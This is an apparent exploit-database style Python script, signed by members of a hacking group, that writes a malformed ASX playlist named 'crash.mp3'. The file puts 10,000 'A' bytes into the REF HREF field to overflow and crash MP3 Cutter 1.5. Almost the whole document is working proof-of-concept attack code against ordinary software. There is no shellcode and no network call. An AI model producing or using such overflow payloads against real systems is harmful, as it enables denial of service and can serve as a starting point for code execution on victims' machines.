##########################################################
##       Legion of Xtremers & Hackers Garage 
##       (www.loxian.co.cc)   (www.garage4hackers.com)                                                  
##                     MP3 Cutter 1.5 Crash Exploit 
##
##               Author: Prashant a.k.a t3rm!n4t0r						    
##           	c0ntact: happyterminator@gmail.com					   
##                                   				  
##  Greetz to: vinnu, b0nd, fb1h2s, Anarki, Nikhil, D4RK3ST
###########################################################






#exploit.py
#MP3 cutter Crash Exploit

print " MP3 Cutter Crash Exploit ( mp3 file ) \n"

         	
header1 = (
			"\x3C\x41\x53\x58\x20\x56\x45\x52\x53\x49\x4F\x4E\x3D\x22\x33"
		        "\x2E\x30\x22\x3E\x0A\x0A\x3C\x45\x4E\x54\x52\x59\x3E\x3C\x54"
			"\x49\x54\x4C\x45\x3E\x65\x78\x70\x6C\x6F\x69\x74\x3C\x2F\x54"
			"\x49\x54\x4C\x45\x3E\x0A\x3C\x52\x45\x46\x20\x48\x52\x45\x46"
			"\x3D\x22"
			)

header2 = (
			"\x2E\x61\x73\x66\x22\x2F\x3E\x0A\x3C\x2F\x45\x4E\x54\x52\x59"
			"\x3E\x3C\x2F\x41\x53\x58\x3E"
		   )
			
crash = "\x41" * 10000

exploit = header1 + crash  + header2

try:
    out_file = open("crash.mp3",'w')
    out_file.write(exploit)
    out_file.close()
    raw_input("\nExploit file created!\n")
except:
    print "Error"